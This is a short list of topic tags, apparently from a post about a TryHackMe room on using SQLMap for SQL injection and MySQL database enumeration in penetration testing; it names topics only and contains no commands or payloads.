`TryHackMe` `SQLMap` `SQL Injection` `Web Security` `MySQL` `Automation` `Database Enumeration` `Penetration Testing` `CyberJourney`